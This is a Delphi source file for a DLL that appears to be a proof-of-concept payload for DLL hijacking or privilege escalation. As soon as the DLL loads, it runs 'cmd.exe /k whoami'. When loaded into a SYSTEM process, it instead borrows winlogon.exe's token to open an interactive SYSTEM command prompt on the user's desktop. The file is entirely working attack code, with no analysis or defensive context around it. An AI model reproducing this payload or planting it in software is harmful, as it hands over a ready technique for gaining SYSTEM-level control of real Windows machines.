library Project1;

{$R *.res}

uses
  WinApi.Windows,
  System.SysUtils,
  System.Classes,
  TlHelp32;

type
  LPCWSTR = PWideChar;
  LPWSTR = PWideChar;
  DWORD = LongWord;

const
  kernel32 = 'kernel32.dll';
  wtsapi32 = 'wtsapi32.dll';
  userenv = 'userenv';

function ExpandEnvironmentStrings(lpSrc: LPCWSTR; lpDst: LPWSTR; nSize: DWORD): DWORD; stdcall;
external kernel32 name 'ExpandEnvironmentStringsW';

function WTSQueryUserToken(SessionId: DWORD; phToken: pHandle): bool; stdcall;
external wtsapi32 name 'WTSQueryUserToken';

function CreateEnvironmentBlock(var lpEnvironment: Pointer; hToken: THandle; bInherit: BOOL): BOOL; stdcall;
external userenv name 'CreateEnvironmentBlock';

function DestroyEnvironmentBlock(pEnvironment: Pointer): BOOL; stdcall;
external userenv name 'DestroyEnvironmentBlock';

function GetPID(IFile: string): DWORD;
var
  IH: THandle;
  IPE: TProcessEntry32;
begin
  Result := 0;
  IFile := UpperCase(IFile);
  IH := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if IH <> 0 then
  try
    IPE.dwSize := Sizeof(IPE);
    if Process32First(IH, IPE) then
      repeat
        if Pos(IFile, UpperCase(ExtractFilename(StrPas(IPE.szExeFile)))) > 0 then
        begin
          Result := IPE.th32ProcessID;
          Break;
        end;
      until not Process32Next(IH, IPE);
  finally
    CloseHandle(IH);
  end;
end;

function CreateProcessAsSystemInteractive(IFile, ICommandLine, IDir: PWideChar; IShow: Word): Boolean;
var
  hToken, hUserToken: THandle;
  si: TStartupInfoW;
  pi: TProcessInformation;
  Ip: Pointer;
  pr: Cardinal;
begin
  Result := False;
  pr := GetPID('winlogon.exe');
  ZeroMemory(@si, sizeof(si));
  si.cb := SizeOf(StartupInfo);
  si.lpDesktop := ('winsta0\default');
  si.wShowWindow := IShow;
  if WTSQueryUserToken(WtsGetActiveConsoleSessionID, @hUserToken) then
    if OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, False, pr), MAXIMUM_ALLOWED, hToken) then
      if CreateEnvironmentBlock(Ip, hUserToken, True) then
        if CreateProcessAsUserW(hToken, IFile, ICommandLine, nil, nil, False, CREATE_UNICODE_ENVIRONMENT, Ip, IDir, si, pi) then
          Result := True;
  CloseHandle(hToken);
  CloseHandle(hUserToken);
  DestroyEnvironmentBlock(Ip);
end;

function GetDomenUserName(): string;
var
  UserNameDesktop, UserNameProfile: string;

  function GetWin(Comand: string): string;
  var
    buff: array[0..$FF] of char;
  begin
    ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
    Result := buff;
  end;

  function GetUserName(Path: string): string;
  var
    i, j: Integer;
    ostr: string;
    b: Boolean;
  begin
    b := False;
    j := Length(Path);
    for i := j downto 1 do
    begin
      if Path[i] = '\' then b := True;
      if b = False then ostr := Path[i] + ostr;
    end;
    Result := ostr;
  end;

begin
  Result := '';
  UserNameDesktop := '%COMPUTERNAME%';
  UserNameDesktop := GetWin(UserNameDesktop);
  UserNameProfile := '%USERPROFILE%';
  UserNameProfile := GetWin(UserNameProfile);
  UserNameProfile := GetUserName(UserNameProfile);
  Result := PChar(UserNameDesktop + '\' + UserNameProfile);
end;

procedure MExec;
begin
  if GetDomenUserName <> 'NT AUTHORITY\SYSTEM' then
  begin
    WinExec(PAnsiChar('cmd.exe /k whoami'), 1);
	ExitProcess(0);
  end else
    CreateProcessAsSystemInteractive('c:\windows\system32\cmd.exe',
      '/k whoami','c:\windows\system32', 1);
end;

procedure DLLEntryPoint(dwReason: DWord);
begin
  case dwReason of
    DLL_PROCESS_ATTACH:
      MExec;
    DLL_PROCESS_DETACH:
      MessageBeep(0);
    DLL_THREAD_ATTACH:
      MessageBeep(0);
    DLL_THREAD_DETACH:
      MessageBeep(0);
  end;
end;

begin
  DllProc := @DLLEntryPoint;
  DLLEntryPoint(DLL_PROCESS_ATTACH);
end.
